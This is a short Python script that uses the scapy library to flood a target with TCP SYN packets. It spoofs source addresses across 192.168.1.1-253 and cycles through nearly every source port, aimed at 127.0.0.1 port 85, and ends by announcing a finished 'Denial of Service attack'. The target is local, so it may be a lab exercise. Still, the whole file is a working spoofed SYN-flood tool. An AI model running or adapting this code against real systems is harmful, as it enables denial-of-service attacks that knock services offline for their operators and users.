from docopt import docopt
import logging
import sys

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


def main():
    src_net = "192.168.1."
    dst_ip = "127.0.0.1"
    dst_port = 85

    for src_host in range(1, 254):

        for src_port in range(1024, 65535):

            print(src_port)
            # Build the packet
            src_ip = src_net + str(src_host)
            network_layer = IP(src=src_ip, dst=dst_ip)
            transport_layer = TCP(sport=src_port, dport=dst_port, flags="S")

            # Send the packet
            send(network_layer / transport_layer, verbose=False)

            #time.sleep(1)

    print("[+] Denial of Service attack finished.")


if __name__ == '__main__':
    main()
